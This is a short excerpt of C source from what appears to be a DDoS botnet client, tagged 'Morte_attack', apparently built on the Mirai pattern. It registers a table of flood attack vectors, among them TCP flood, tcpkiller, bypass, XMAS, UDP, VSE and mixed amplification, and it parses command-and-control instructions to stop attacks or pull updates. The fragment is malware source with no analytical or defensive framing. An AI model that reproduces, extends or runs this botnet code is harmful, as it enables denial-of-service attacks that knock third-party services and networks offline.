...
{
    int i;
    add_attack(ATK_VEC_TCPFLOOD, (ATTACK_FUNC)attack_tcpflood);
    add_attack(ATK_VEC_TCPBOOM, (ATTACK_FUNC)attack_tcpboom);
    add_attack(ATK_VEC_TCPKILLER, (ATTACK_FUNC)attack_tcpkiller);
    add_attack(ATK_VEC_TCPBYPASS, (ATTACK_FUNC)attack_tcpbypass);
    add_attack(ATK_VEC_TCPFRAG, (ATTACK_FUNC)attack_tcpfrag);
    add_attack(ATK_VEC_XMAS, (ATTACK_FUNC)attack_tcpxmas);

    add_attack(ATK_VEC_UDP_PLAIN, (ATTACK_FUNC)attack_udp_plain);
    add_attack(ATK_VEC_STD, (ATTACK_FUNC)attack_std);
    add_attack(ATK_VEC_UDPBYPASS, (ATTACK_FUNC)attack_udpbypass);
    add_attack(ATK_VEC_VSE, (ATTACK_FUNC)attack_vse);
    add_attack(ATK_VEC_MIXAMP, (ATTACK_FUNC)attack_mixamp);
...
void attack_parse(char *buf, int len)
{
    ...
    {
#ifdef DEBUG
        printf("[Morte_attack] Stop attack\n");
#endif
        attack_kill_all();
        return;
    }
    ...
    {
#ifdef DEBUG
        printf("[Morte_attack] Update command received\n");
#endif
        handle_update(buf, len);
        return;
    }
